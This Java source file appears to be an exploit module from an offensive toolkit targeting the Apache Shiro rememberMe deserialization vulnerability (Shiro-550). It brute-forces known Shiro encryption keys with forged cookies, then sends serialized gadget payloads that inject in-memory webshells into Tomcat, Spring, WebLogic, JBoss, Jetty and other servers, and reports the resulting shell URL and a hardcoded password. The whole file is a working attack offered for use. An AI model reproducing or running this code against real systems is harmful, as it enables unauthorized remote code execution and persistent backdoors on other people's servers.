package exp.shiro;

import core.GenerateMemShell;
import core.GeneratePayload;
import core.enumtypes.PayloadType;
import core.memshell.*;
import exp.AttackBase;
import exp.BaseExp;
import okhttp3.Response;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.subject.SimplePrincipalCollection;
import org.apache.shiro.util.ByteSource;
import ui.Config;
import utils.Util;

import javax.xml.bind.DatatypeConverter;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;


public class Shiro_550 extends BaseExp implements AttackBase {

    public String realShiroKey;
    public String target;
    public String keyWord;
    public boolean aesGCM = false;

    public Shiro_550(){
        super();
    }

    public Shiro_550(String target, String keyWord, String realShiroKey, boolean aesGCM){
        super();
        this.realShiroKey = realShiroKey;
        this.target = target;
        this.keyWord = keyWord;
        this.aesGCM = aesGCM;
    }

    public String generateRememberMe(byte[] serializeByte, byte[] shirokey) throws Exception {
        String rememberMe = "";
        try {
            byte[] encryptPayload = null;
            if(this.aesGCM){
                AesCipherService aesCipherService = new AesCipherService();
                ByteSource byteSource = aesCipherService.encrypt(serializeByte, shirokey);
                encryptPayload = byteSource.getBytes();
            }else{
                encryptPayload = Util.AESEncrypt(serializeByte, shirokey);
            }
            rememberMe = this.keyWord +"=" +  DatatypeConverter.printBase64Binary(encryptPayload);
        } catch (Exception e) {

        }
        return rememberMe;
    }

    public static List<String> getALLShiroKeys() {
        List<String> shiroKeys = new ArrayList<String>();
        try {
//            URL url = this.getClass().getProtectionDomain().getClassLoader().getResource("data/shiro_keys.txt");
//            System.out.println(url.toURI().toURL());
//            File shiro_file = new File(url.toURI().getPath());
//            BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(shiro_file), "UTF-8"));
//            try {
//                String line;
//                while ((line = br.readLine()) != null){
//                    shiroKeys.add(line);
//                    System.out.println(line);
//                }
//            } catch (IOException e) {
//                e.printStackTrace();
//            } finally {
//                if (br != null)
//                    br.close();
//            }
            InputStream in = Util.class.getProtectionDomain().getClassLoader().getResourceAsStream("data/shiro_keys.txt");
            byte[] bytes = new byte[1024];
            ByteArrayOutputStream baous = new ByteArrayOutputStream();
            int len = 0;
            while((len = in.read(bytes)) != -1){
                baous.write(bytes, 0 , len);
            }

            in.close();
            baous.close();
            String re = new String(baous.toByteArray());
            String[] keysTmp = re.split("\r\n");
            int length = keysTmp.length;
            for(int i=0; i < length; i++){
                shiroKeys.add(keysTmp[i]);
            }
        } catch (Exception e) {
            String message = e.getMessage();
            System.out.println(message);
        }
        return shiroKeys;
    }


    public String singleKeyTestTask(String shiroKey) throws Exception{
        String info = "";
        try {
            String rememberMe = generateRememberMe(Util.serialize(new SimplePrincipalCollection()),
                    Util.base64Decode(shiroKey));
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("Cookie", rememberMe);
            // sendRequest
            Response response = this.launch(this.target, header);
            String result = response.headers().toString();
            response.close();
            if (!result.contains("=deleteMe")) {
                info = String.format("%s 探测成功\n", shiroKey);
            }
            else{
                info = String.format("%s 探测失败\n", shiroKey);
            }

        } catch (Exception e) {
            info = String.format("探测过程中出现错误:%s\n", e.getMessage());
        }
        return info;
    }


    public String allKeyTestTask() throws Exception {
        String info = "";
        List<String> shiroKeys = this.getALLShiroKeys();
        try {
            for (int i = 0; i < shiroKeys.size(); i++) {
                String shirokey = shiroKeys.get(i);
                try {
                    String rememberMe = generateRememberMe(Util.serialize(new SimplePrincipalCollection()),
                            Util.base64Decode(shirokey));
                    HashMap<String, String> header = new HashMap<String, String>();
                    header.put("Cookie", rememberMe);
                    // sendRequest
                    Response response = this.launch(target, header);
                    String result = response.headers().toString();
                    response.close();
                    if (!result.contains("=deleteMe")) {
                        info = String.format("%s 探测成功\n", shirokey);
                        break;
                    }

                } catch (Exception e) {
                    info = String.format("探测过程中出现错误:%s\n", e.getMessage());
                }
            }
        } catch (Exception e) {
            info = String.format("探测过程中出现错误:%s\n", e.getMessage());
        }
        return info;
    }

    public boolean attack(String target, String gadgetType, String payloadType, String trojanString)  {

        try {
            Object payload = GeneratePayload.generatePayload(gadgetType, payloadType, "");
            String rememberMe = generateRememberMe(Util.serialize(payload), Util.base64Decode(this.realShiroKey));
            HashMap<String, String> header = new HashMap<String, String>();
            header.put("Cache-Control", "max-age=0");
            header.put("Cookie", rememberMe);
            String mime = "application/x-www-form-urlencoded; charset=utf-8";
            // sendRequest
            String postString = "dy=" + URLEncoder.encode(trojanString, "UTF-8");
            this.launch(target, postString, mime, header);
            header.remove("Cookie");
            header.put("X-Requested-With", "XmlHTTPRequest");
            Response response = this.launch(target, header);
            String bodyResult = response.body().string();
            response.close();
            if (bodyResult.contains("Success")) {
                Util.messageQueue.add(String.format("Gadget： %s\n", gadgetType));
                Util.messageQueue.add(String.format("Shell_Url： %s\n", target));
                Util.messageQueue.add(String.format("PassWord： pAS3\n"));
                Util.messageQueue.add(String.format("Key： key\n"));
                Util.messageQueue.add(String.format("header： X-Requested-With:XMLHTTPRequest\n"));
                Util.messageQueue.add("---------------------------\n");
                return true;
            }else {
                Util.messageQueue.add("注入失败");
            }

        }catch (Exception e){
            Util.messageQueue.add(String.format("注入过程发生错误： %s", e.getMessage()));
        }
        return false;
    }

    public void sendAllGadget(String stripUrl, String payloadType, String trojanType){
        for(String gadget: Config.CommonsGadget){
            if (gadget.equalsIgnoreCase("all"))continue;
            if (this.attack(stripUrl, gadget, payloadType, trojanType)){
                break;
            }
        }
    }

    @Override
    public void run(HashMap<String, String> params) throws Exception {

        String target = params.get("target");
        String payloadType = params.get("payloadType");
        String gadgetType = params.get("gadgetType");
        String trojanType = params.get("trojanType");
        this.keyWord = params.get("keyWord");
        this.realShiroKey = params.get("shiroKey");
        this.aesGCM = Boolean.parseBoolean(params.get("aesGCM"));
        String trojanString = "";
        PayloadType payloadType1 = null;
        for (PayloadType pt : PayloadType.values()) {
            if (trojanType.toLowerCase().equals(String.valueOf(pt))) {
                payloadType1 = pt;
                break;
            }
        }
        switch (payloadType1) {
            case tongweblistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(TongWebListenerMemShell.class));
                break;
            case tongwebfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(TongWebFilterMemShell.class));
                break;
            case weblogiclistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(WeblogicListenerMemShell.class));
                break;
            case weblogicfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(WeblogicFilterMemShell.class));
                break;
            case commandmemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(CommandMemShell.class));
                break;
            case jbosslistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(JBossListenerMemShell.class));
                break;
            case jbossfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(JBossFilterMemShell.class));
                break;
            case resinfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(ResinFilterMemShell.class));
                break;
            case resinlistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(ResinListenerMemShell.class));
                break;
            case jettyfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(JettyFilterMemShell.class));
                break;
            case jettylistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(JettyListenerMemShell.class));
                break;
            case glassfishfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(GlassFishFilterMemShell.class));
                break;
            case glassfishlistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(GlassFishListenerMemShell.class));
                break;
            case springwebfluxhandlermemshell:
                trojanString = GenerateMemShell.generateMemShell("SpringWebfluxHandlerMemShell", "BASE64", "8");
                break;
            case tomcatfiltermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(TomcatFilterMemShell.class));
                break;
            case tomcatlistenermemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(TomcatListenerMemShell.class));
                break;
            case springbootmemshell:
                trojanString = Util.base64Encode(Util.getClassBytes(SpringBootMemShell.class));
                break;
        }
        if (gadgetType.equalsIgnoreCase("all")){
            this.sendAllGadget(target, payloadType, trojanString);
        }
        else {
            this.attack(target, gadgetType, payloadType, trojanString);

        }
    }

}
